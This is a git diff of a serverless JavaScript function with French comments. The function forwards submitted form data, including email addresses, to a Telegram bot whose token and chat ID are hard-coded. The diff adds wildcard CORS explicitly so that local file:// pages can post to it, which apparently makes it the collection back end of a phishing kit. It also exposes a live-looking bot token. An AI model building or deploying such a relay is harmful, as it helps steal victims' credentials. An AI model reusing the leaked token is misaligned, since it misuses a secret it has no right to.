@@ -1,8 +1,22 @@
 const querystring = require('querystring');
 
 export async function handler(event, context) {
-  const TELEGRAM_BOT_TOKEN = "8141255892:AAFhu2NO9bg3_zDEsblztNaT_JmudJRtUpk";  // remplace par ton vrai token
-  const CHAT_ID = "7625905877"; // remplace par ton vrai chat_id
+  const TELEGRAM_BOT_TOKEN = "8141255892:AAFhu2NO9bg3_zDEsblztNaT_JmudJRtUpk";
+  const CHAT_ID = "7625905877";
+
+  // ✅ En-têtes CORS
+  const headers = {
+    "Access-Control-Allow-Origin": "*", // <- autorise depuis file:// et tous les domaines
+    "Access-Control-Allow-Headers": "Content-Type"
+  };
+
+  // ✅ Réponse au preflight OPTIONS (navigateur l’envoie automatiquement parfois)
+  if (event.httpMethod === "OPTIONS") {
+    return {
+      statusCode: 200,
+      headers
+    };
+  }
 
   const body = querystring.parse(event.body);
   const email = body.email || 'inconnu';
@@ -19,11 +33,13 @@ export async function handler(event, context) {
 
     return {
       statusCode: 200,
+      headers, // ✅ ajout des headers ici
       body: JSON.stringify({ ok: true, data })
     };
   } catch (error) {
     return {
       statusCode: 500,
+      headers, // ✅ aussi ici
       body: JSON.stringify({ ok: false, error: error.message })
     };
   }
